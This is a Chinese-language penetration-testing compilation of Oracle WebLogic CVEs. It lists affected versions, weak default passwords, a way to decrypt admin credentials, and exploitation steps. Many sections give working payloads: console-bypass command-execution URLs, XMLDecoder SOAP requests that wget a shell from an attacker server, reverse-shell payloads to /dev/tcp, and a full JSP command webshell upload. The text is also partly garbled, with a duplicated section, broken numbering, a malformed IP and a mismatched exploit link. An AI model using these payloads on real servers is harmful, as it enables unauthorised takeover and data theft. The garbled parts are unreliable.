## 一、Weblogic 介绍

WebLogic是美国Oracle公司出品的一个application
server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java
Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

## 二、漏洞相关

### 2.1、已收集漏洞

    
    
    Weblogic 反序列化漏洞 CVE-2021-2394
    Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109
    Weblogic RCE CVE-2020-14882&14883
    weblogic jndi注入CVE-2020-14841
    Weblogic coherence组件iiop反序列化漏洞 (CVE-2020-14644)
    WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645
    WebLogic CVE-2020-14756 T3IIOP反序列化RCE
    Weblogic 远程代码执行漏洞 CVE-2020-2883
    Weblogic CVE-2020-2551 IIOP协议反序列化rce
    Weblogic反序列化漏洞 CVE-2019-2890
    Weblogic反序列化远程代码执行漏洞CVE-2019-2725
    Weblogic反序列化漏洞 CVE-2019-2729
    Weblogic任意文件读取漏洞（CVE-2019-2615)）
    Weblogic 文件上传漏洞（CVE-2019-2618）
    weblogic 反序列化漏洞 CVE-2018-3252
    Weblogic反序列化远程代码执行漏洞 CVE-2018-3245
    Weblogic远程代码执行漏洞 CVE-2018-3191
    Weblogic任意文件上传漏洞（CVE-2018-2894）
    Weblogic WLS核心组件反序列化漏洞 CVE-2018-2893
    Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628
    WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）
    Weblogic 反序列化漏洞 CVE-2017-3506
    Weblogic 反序列化漏洞 CVE-2017-3248
    Weblogic SSRF漏洞 CVE-2014-4210
    

### 2.2、weblogic漏洞扫描工具

https://github.com/0xn0ne/weblogicScanner

可以检测以下漏洞

    
    
    weblogic administrator console、CVE-2014-4210、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2017-3506、CVE-2017-10271、CVE-2018-2628、CVE-2018-2893、CVE-2018-2894、CVE-2018-3191、CVE-2018-3245、CVE-2018-3252、CVE-2019-2618、CVE-2019-2725、CVE-2019-2729、CVE-2019-2890、CVE-2020-2551、CVE-2020-14882、CVE-2020-14883
    

### 2.3、常用弱口令

    
    
    weblogic Oracl@123
    weblogic weblogic
    guest guest
    portaladmin portaladmin
    admin security
    joe password
    mary password
    system security
    wlcsystem wlcsystem
    wlcsystem sipisystem
    system password
    

### 2.4、通过任意文件读取来获取weblogic账号密码

假设通过以下可读取文件

    
    
    http://192.168.1.15:7001/hello/file.jsp?path=/etc/passwd
    

weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml

SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy
to file就可以保存成一个文件：

![weblogic-xz1](https://image.3001.net/images/20210816/1629093977_611a0059dca7f1880678e.png!small)

密文获取

config.xml是base_domain的全局配置文件，找到其中的的值，即为加密后的管理员密码

![weblogic-xz2](https://image.3001.net/images/20210816/1629093981_611a005d1c8a6c7c673fe.png!small)

解密密文即可

解密工具

    
    
    https://github.com/Ch1ngg/WebLogicPasswordDecryptorUi
    

## 三、Weblogic-CVE漏洞

按照年份分下类

### 3.1、2021年

    
    
    Weblogic 反序列化漏洞 CVE-2021-2394
    Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109
    

3.1.1、CVE-2021-2394（Weblogic 反序列化漏洞 ）

#### （1）、介绍

这是一个二次反序列化漏洞,是cve-2020-14756和cve-2020-14825的调用链相结合组成一条新的调用链来绕过weblogic黑名单列表。

#### （2）、影响版本

    
    
    10.3.6.0.0
    12.1.3.0.0
    12.2.1.3.0
    12.2.1.4.0
    14.1.1.0.0
    

#### （3）、利用

POC

    
    
    https://github.com/freeide/CVE-2021-2394
    

3.1.2、CVE-2021-2394（Weblogic 反序列化漏洞 ）

#### （1）、介绍

这是一个二次反序列化漏洞,是cve-2020-14756和cve-2020-14825的调用链相结合组成一条新的调用链来绕过weblogic黑名单列表。

#### （2）、影响版本

    
    
    10.3.6.0.0
    12.1.3.0.0
    12.2.1.3.0
    12.2.1.4.0
    14.1.1.0.0
    

#### （3）、利用

POC

    
    
    https://github.com/freeide/CVE-2021-2394
    

3.1.2、CVE-2021-2109（Weblogic LDAP 远程代码执行漏洞 ）

#### （1）、介绍

CVE-2021-2109 中，攻击者可构造恶意请求，造成JNDI注入，执行任意代码，从而控制服务器。

#### （2）、影响版本

    
    
    10.3.6.0.0
    12.1.3.0.0
    12.2.1.3.0
    12.2.1.4.0
    14.1.1.0.0
    

#### （3）、利用

下载工具(用于 JNDI注入 利用)：

    
    
    https://github.com/feihong-cs/JNDIExploit/releases/tag/v.1.11
    

执行

    
    
    java -jar JNDIExploit-v1.11.jar -i 192.168.204.131
    

exp执行ls命令

    
    
    POST /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.204;131:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1
    
    Host: 192.168.204.131:49163
    
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    
    Accept-Language: en-US,en;q=0.5
    
    Accept-Encoding: gzip, deflate
    
    Connection: close
    
    cmd:ls
    
    Cookie: ADMINCONSOLESESSION=nM8lXW3nshhqyFuWs47qjIiQP0tUMtRYRHbBUFDXA8QIxRpdyNqr!964275826
    
    Upgrade-Insecure-Requests: 1
    

## 3.2、2020年

    
    
    Weblogic RCE CVE-2020-14882&14883
    weblogic jndi注入CVE-2020-14841
    Weblogic coherence组件iiop反序列化漏洞 (CVE-2020-14644)
    WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645
    WebLogic CVE-2020-14756 T3IIOP反序列化RCE
    Weblogic 远程代码执行漏洞 CVE-2020-2883
    Weblogic CVE-2020-2551 IIOP协议反序列化rce
    

3.2.1、 CVE-2020-14882&14883（Weblogic RCE）

#### （1）、介绍

CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。

#### （2）、影响版本

    
    
    10.3.6.0.0
    12.1.3.0.0
    12.2.1.3.0
    12.2.1.4.0
    14.1.1.0.0
    

#### （3）、利用

CVE-2020-14882：允许未授权的用户绕过管理控制台的权限验证访问后台

远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console。

访问以下URL，未授权访问到管理后台页面（低权限的用户）：

    
    
    http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal
    

![CVE-2020-14882-1](https://image.3001.net/images/20210816/1629093983_611a005f9061b05a7216e.png!small)

目前是低权限用户，无法安装用户

CVE-2020-14883：允许后台任意用户通过HTTP协议执行任意命令

方法1

直接代码执行，创建文件

    
    
    127.0.0.1:70001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/123');")
    

方法2

构建一个恶意的xml文件放在能访问到的web服务器上

    
    
    <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
    <list>
    <value>-c</value>
    <value>/bin/bash</value>
    <value><![CDATA[bash -i >& /dev/tcp/1.1.1.1/8888 0>&1]]></value>
    </list>
    </constructor-arg>
    </bean>
    </beans>
    

放在

    
    
    http://1.1.1.1/rce.xml
    

执行后进行反弹

    
    
    http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://1.1.1.1/rce.xml")
    

3.2.2、CVE-2020-14841（weblogic jndi注入）

#### （1）、介绍

参考文章

    
    
    https://www.77169.net/html/270571.html
    

#### （2）、影响版本

    
    
    10.3.6.0.0
    12.1.3.0.0
    12.2.1.3.0
    12.2.1.4.0
    14.1.1.0.0
    

#### （3）、利用

POC

    
    
    // JdbcRowSetImpl
    JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
    jdbcRowSet.setDataSourceName("rmi://192.168.3.254:8888/xsmd");
    
    MethodAttributeAccessor methodAttributeAccessor = new MethodAttributeAccessor();
    methodAttributeAccessor.setGetMethodName("getDatabaseMetaData");
    methodAttributeAccessor.setIsWriteOnly(true);
    methodAttributeAccessor.setAttributeName("UnicodeSec");
    
    
    LockVersionExtractor extractor = new LockVersionExtractor(methodAttributeAccessor, "UnicodeSec");
    
    final ExtractorComparator comparator = new ExtractorComparator(extractor);
    final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
    
    
    Object[] q = new Object[]{jdbcRowSet, jdbcRowSet};
    Reflections.setFieldValue(queue, "queue", q);
    Reflections.setFieldValue(queue, "size", 2);
    
    Field comparatorF = queue.getClass().getDeclaredField("comparator");
    comparatorF.setAccessible(true);
    comparatorF.set(queue, new ExtractorComparator(extractor));
    

3.2.3、 CVE-2020-14756（WebLogic T3IIOP反序列化RCE）

#### （1）、介绍

无

#### （2）、影响版本

    
    
    未找到
    

exp

    
    
    https://github.com/Y4er/CVE-2020-14645
    

#### （3）、利用

### 3.2.4、CVE-2020-14645（WebLogic UniversalExtractor反序列化漏洞）

#### （1）、介绍

攻击者可利用该漏洞实现远程代码执行。该反序列化的gadget存在与coherence包中。

#### （2）、影响版本

    
    
    10.3.6.0.0
    12.2.1.4.0
    12.2.1.3.0
    12.1.3.0.0
    14.1.1.0.0
    

#### （3）、利用

exp

    
    
    https://github.com/Y4er/CVE-2020-14645
    

3.2.5、CVE-2020-14644 (Weblogic coherence组件iiop反序列化漏洞)

#### （1）、介绍

参考文章

    
    
    https://www.cnblogs.com/potatsoSec/p/13451993.html
    

#### （2）、影响版本

    
    
    12.2.1.3.0
    12.1.3.0.0
    14.1.1.0.0
    

#### （3）、利用

exp

    
    
    https://github.com/potats0/cve_2020_14644
    

3.2.6、CVE-2020-2883（Weblogic 远程代码执行漏洞 ）

#### （1）、介绍

Weblogic 默认开启 T3 协议，攻击者可利用T3协议进行反序列化漏洞实现远程代码执行。

#### （2）、影响版本

    
    
    10.3.6.0.0
    12.1.3.0.0
    12.2.1.3.0
    12.2.1.4.0
    

#### （3）、利用

exp

    
    
    https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2020-2883_cmd.py
    

3.2.7、CVE-2020-2551（Weblogic IIOP协议反序列化rce ）

#### （1）、介绍

漏洞依然是由于调用远程对象的实现存在缺陷，导致序列化对象可以任意构造，在使用之前未经安全检查，导致恶意代码被执行。

#### （2）、影响版本

    
    
    10.3.6.0.0
    12.1.3.0.0
    12.2.1.3.0
    12.2.1.4.0
    

#### （3）、利用

exp

    
    
    https://github.com/Y4er/CVE-2020-2551
    

### 3.3、2019

    
    
    Weblogic反序列化漏洞 CVE-2019-2890
    Weblogic反序列化远程代码执行漏洞CVE-2019-2725
    Weblogic反序列化漏洞 CVE-2019-2729
    Weblogic任意文件读取漏洞（CVE-2019-2615)）
    Weblogic 文件上传漏洞（CVE-2019-2618）
    

3.3.1、CVE-2019-2890（Weblogic反序列化漏洞 ）

#### （1）、介绍

Weblogic在利用T3协议进行远程资源加载调用时，默认会进行黑名单过滤以保证反序列化安全。漏洞CVE-2019-2890绕过了Weblogic的反序列化黑名单，使攻击者可以通过T3协议对存在漏洞的Weblogic组件实施远程攻击，但该漏洞利用条件较高，官方也归类为需要身份认证。与CVE-2019-2725类似。

#### （2）、影响版本

    
    
    10.3.6.0
    
    12.1.3.0
    
    12.2.1.3
    

#### （3）、利用

exp

    
    
    https://github.com/SukaraLin/CVE-2019-2890
    

判断是否存在漏洞，如下图所示则可能存在漏洞

    
    
    http://ip:7001/_async/AsyncResponseService
    

![CVE-2019-2729-1](https://image.3001.net/images/20210816/1629093984_611a0060b41bc2fc7009a.png!small)

开个web服务

放一个shell.jsp

通过以下请求包，上传到服务器

    
    
    POST /_async/AsyncResponseService HTTP/1.1
    Host: you ip:7001
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Connection: close
    Content-Length: 858
    content-type: text/xml
    
    <soapenv:Envelope
    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
    <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>wget http://ip:端口/shell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp</string>
    </void>
    </array>
    <void method="start"/></void>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body>
    <asy:onAsyncDelivery/>
    </soapenv:Body></soapenv:Envelope>
    

文件地址

    
    
    http://ip:7001/_async/shell.jsp
    

3.3.2、CVE-2019-2729（Weblogic反序列化漏洞 ）

#### （1）、介绍

是对CVE-2019-2725打的补丁被绕过了，使用标签替换标签。  
  

#### （2）、影响版本

    
    
    10.3.6.0.0
    12.1.3.0.0
    12.2.1.3.0
    

#### （3）、利用

exp

    
    
    https://github.com/ruthlezs/CVE-2019-2729-Exploit
    python CVE-2019-2729.py -u 地址 -c whoami
    

3.3.3、CVE-2019-2725(Weblogic反序列化远程代码执行漏洞)

#### （1）、介绍

CVE-2019-2725是一个Oracle
weblogic反序列化远程命令执行漏洞，这个漏洞依旧是根据weblogic的xmldecoder反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。与CVE-2019-2618类似。

#### （2）、影响版本

    
    
    10.*
    12.1.3
    

#### （3）、利用

漏洞存在的页面：

    
    
    /_async/AsyncResponseService
    

能访问就可能存在漏洞

![CVE-2020-14882-1](https://image.3001.net/images/20210816/1629093983_611a005f9061b05a7216e.png!small)

开个web服务放shell.txt，上传到服务器

    
    
    POST /_async/AsyncResponseService HTTP/1.1
    Host: IP:PORT
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Connection: close
    Content-Length: 859
    Accept-Encoding: gzip, deflate
    SOAPAction:
    Accept: */*
    User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
    Connection: keep-alive
    content-type: text/xml
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
    xmlns:asy="http://www.bea.com/async/AsyncResponseService">
    <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>wget http://ip:端口/shell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp</string>
    </void>
    </array>
    <void method="start"/></void>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body>
    <asy:onAsyncDelivery/>
    </soapenv:Body></soapenv:Envelope>
    

位置

    
    
    ip:7001/bea_wls_deployment_internal/shell.jsp
    

3.3.4、CVE-2019-2618（Weblogic 文件上传漏洞）

#### （1）、介绍

主要是利用了WebLogic组件中的DeploymentService接口，该接口支持向服务器上传任意文件。攻击者突破了OAM（Oracle Access
Management）认证，设置wl_request_type参数为app_upload，构造文件上传格式的POST请求包，上传jsp木马文件，进而可以获得整个服务器的权限。

#### （2）、影响版本

    
    
    10.3.6.0
    12.1.3.0
    12.2.1.3
    

#### （3）、利用

 **前提是要有账号密码**

上传成功后会返回文件地址

POST包

    
    
    POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1
    Host: ip:7001
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.21.0
    username: weblogic
    wl_request_type: app_upload
    cache-control: no-cache
    wl_upload_application_name: ../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war
    serverName: weblogic
    password: 12345.com
    content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
    archive: true
    server_version: 10.3.6.0
    wl_upload_delta: true
    Content-Length: 1083
    
    ------WebKitFormBoundary7MA4YWxkTrZu0gW
    Content-Disposition: form-data; name="shell.jsp"; filename="shell.jsp"
    Content-Type: false
    
    <%@ page import="java.util.*,java.io.*"%>
    <%
    %>
    <HTML><BODY>
    Commands with JSP
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <%
    if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<br>
    
    
    
    ");
    Process p;
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
    p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    }
    else{
    p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
    }
    }
    %>
    </pre>
    </BODY></HTML>
    
    ------WebKitFormBoundary7MA4YWxkTrZu0gW--    

地址

    
    
    ip:7001/bea_wls_deployment_internal/shell.jsp
    

3.3.5、CVE-2019-2615（Weblogic任意文件读取漏洞)

#### （1）、介绍

利用该漏洞，攻击者可以在已知用户名密码的情况下读取WebLogic服务器中的任意文件。

#### （2）、影响版本

    
    
    10.3.6.0
    12.1.3.0
    12.2.1.3
    

#### （3）、利用

![CVE-2019-2615-1](https://image.3001.net/images/20210816/1629093986_611a0062ed5198ae7f75e.png!small)

### 2.4、2018年

    
    
    weblogic 反序列化漏洞 CVE-2018-3252
    Weblogic反序列化远程代码执行漏洞 CVE-2018-3245
    Weblogic远程代码执行漏洞 CVE-2018-3191
    Weblogic任意文件上传漏洞（CVE-2018-2894）
    Weblogic WLS核心组件反序列化漏洞 CVE-2018-2893
    Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628
    

2.4.1、CVE-2018-3252（weblogic 反序列化漏洞）

#### （1）、介绍

weblogic DeploymentService组件的反序列化漏洞。

#### （2）、影响版本

    
    
    未找到
    

#### （3）、利用

POC

    
    
    https://github.com/pyn3rd/CVE-2018-3252
    

2.4.2、CVE-2018-3245（Weblogic反序列化远程代码执行漏洞 ）

#### （1）、介绍

该漏洞通过 JRMP 协议利用 RMI 机制的缺陷达到执行任意反序列化代码的目的。攻击者可以在未授权的情况下将 payload 封装在 T3 协议中，通过对
T3 协议中的 payload 进行反序列化，从而实现对存在漏洞的 WebLogic 组件进行远程攻击，执行任意代码并可获取目标系统的所有权限。

#### （2）、影响版本

    
    
    10.3.6.0
    12.1.3.0
    12.2.1.3
    

#### （3）、利用

POC

    
    
    https://github.com/pyn3rd/CVE-2018-3245
    

2.4.3、CVE-2018-3191（Weblogic远程代码执行漏洞 ）

#### （1）、介绍

该漏洞允许未经身份验证的攻击者通过T3协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic
Server被攻击者接管，从而造成远程代码执行。

#### （2）、影响版本

    
    
    10.3.6.0
    12.1.3.0
    12.2.1.0
    12.2.1.1
    

#### （3）、利用

POC

    
    
    https://github.com/pyn3rd/CVE-2018-3191
    

2.4.4、CVE-2018-2894（Weblogic任意文件上传漏洞）

#### （1）、介绍

WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do。

#### （2）、影响版本

    
    
    10.3.6.0
    12.1.3.0
    12.2.1.2
    12.2.1.3
    

#### （3）、利用

首先要能够登录后台

/console访问后台登陆后

base_domain的高级配置中

![CVE-2018-2894-1](https://image.3001.net/images/20210816/1629093988_611a0064102e433734eca.png!small)

启用web服务测试页，记得在最下面保存。。。

![CVE-2018-2894-2](https://image.3001.net/images/20210816/1629093989_611a0065e17aca7ad21c7.png!small)

再访问

    
    
    http://XXX:7001/ws_utc/config.do
    

![CVE-2018-2894-3](https://image.3001.net/images/20210816/1629093990_611a0066dbc0b0c73c384.png!small)

设置当前工作目录为

    
    
    /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
    

这个是ws_utc应用的静态文件css目录，访问这个是不需要权限的

然后安全添加jsp

![CVE-2018-2894-4](https://image.3001.net/images/20210816/1629093991_611a0067c6fa69f636877.png!small)

通过审查元素查看时间戳

![CVE-2018-2894-5](https://image.3001.net/images/20210816/1629093992_611a0068ed4aa493ec219.png!small)

/ws_utc/css/config/keystore/[时间戳]_[文件名]

成功访问

    
    
    /ws_utc/css/config/keystore/1627709344373_ce.jsp
    

![CVE-2018-2894-6](https://image.3001.net/images/20210816/1629093994_611a006aab7420985c7e4.png!small)

2.4.5、CVE-2018-2893（Weblogic WLS核心组件反序列化漏洞）

#### （1）、介绍

此漏洞产生于WebLogic的T3服务，因此可通过控制T3协议的访问来临时阻断针对该漏洞的攻击。当开放WebLogic控制台端口（默认为7001端口）时，T3服务会默认开启。

#### （2）、影响版本

    
    
    10.3.6.0
    12.1.3.0
    12.2.1.2
    12.2.1.3
    

#### （3）、利用

    
    
    https://github.com/ryanInf/CVE-2018-2893
    

### 2.4.6、CVE-2018-2628（Weblogic WLS Core Components 反序列化命令执行漏洞）

#### （1）、介绍

#### （2）、影响版本

    
    
    10.3.6.0
    12.2.1.2
    12.2.1.3
    12.1.3.0
    10.3.6.0
    12.2.1.2
    12.2.1.3
    12.1.3.0
    

#### （3）、利用

POC

    
    
    https://github.com/shengqi158/CVE-2018-2628
    

### 2.5、其他年份

    
    
    WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）
    Weblogic 反序列化漏洞 CVE-2017-3506
    Weblogic 反序列化漏洞 CVE-2017-3248
    Weblogic SSRF漏洞 CVE-2014-4210
    

2.5.1、CVE-2017-10271（WebLogic XMLDecoder反序列化漏洞）

#### （1）、介绍

通过构建发送post请求，使用精心构造的xml数据造成任意代码执行

#### （2）、影响版本

    
    
    10.3.6.0.0
    12.1.3.0.0
    12.2.1.1.0
    

#### （3）、利用

初步判断

    
    
    ip/wls-wsat/CoordinatorPortType11
    

存在下图则说明可能存在漏洞

![CVE-2017-10271-1](https://image.3001.net/images/20210816/1629093995_611a006b84def8859c401.png!small)

    
    
    写入文件，ip/wls-wsat/test.txt
    
    POST /wls-wsat/CoordinatorPortType HTTP/1.1
    Host: 192.168.8.148:7001
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Upgrade-Insecure-Requests: 1
    Content-Type: text/xml
    Content-Length: 756
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.6.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter">
    <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt</string><void method="println">
    <string>test(写入内容)</string></void><void method="close"/>
    </object>
    </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
    
    反弹shell（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.4.0" class="java.beans.XMLDecoder">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>bash -i >& /dev/tcp/接收shell的ip/8888 0>&1</string>
    </void>
    </array>
    <void method="start"/></void>
    </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
    

2.5.2、CVE-2017-3506（Weblogic 反序列化漏洞）

#### （1）、介绍

一个XML的反序列化漏洞导致的命令执行。

#### （2）、影响版本

    
    
    10.3.6.0
    12.1.3.0
    12.2.1.0
    12.2.1.1
    12.2.1.2
    

#### （3）、利用

详细讲解

    
    
    https://github.com/bit4woo/code2sec.com/blob/master/weblogic%E6%BC%8F%E6%B4%9ECVE-2017-3506%E5%A4%8D%E7%8E%B0%EF%BC%9AWeb%20Services%E6%A8%A1%E5%9D%97%E7%9A%84%E6%BC%8F%E6%B4%9E.md
    

2.5.3、CVE-2017-3248

（1）、介绍

参考文章

    
    
    https://blog.csdn.net/caiqiiqi/article/details/84246779
    

（2）、影响版本

    
    
    10.3.6.0，
    12.1.3.0
    12.2.1.0
    12.2.1.1
    

（3）、利用

    
    
    https://github.com/quentinhardy/scriptsAndExploits
    

2.5.4、CVE-2014-4210（Weblogic SSRF漏洞 ）

#### （1）、介绍

SSRF（Server-Side Request
Forgery），服务端请求伪造，是一种由攻击者构造形成由服务端发起请求的一个漏洞，一般情况下，SSRF攻击的目标是从外部网络无法访问的内部系统。

#### （2）、影响版本

    
    
    10.0.2.0
    10.3.6.0
    

#### （3）、利用

漏洞位置在uddiexplorer下的SearchPublicRegistries.jsp处

    
    
    http://ip:7001//uddiexplorer/SearchPublicRegistries.jsp
    

![CVE-2014-4210-1](https://image.3001.net/images/20210816/1629093996_611a006c56628bfe52dac.png!small)

访问

    
    
    http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001
    

访问后显示404说明存在该漏洞

![CVE-2014-4210-2](https://image.3001.net/images/20210816/1629093997_611a006d6b9ec8c13855d.png!small)

通过burg抓包查看相关的返回信息

返回该信息说明开放了7001端口

![CVE-2014-4210-3](https://image.3001.net/images/20210816/1629093998_611a006edd137229e753b.png!small)

返回

返回could not connect over HTTP to server，说明不存在此端口

## 四、总结

本文是对Weblogic漏洞的整理，大量信息来源于互联网，如有侵权请告知删除、除了其中的部分内容通过实践证明了，其余部分我并没有实践，所以仅供参考。

 **以上内容仅供学习交流。**

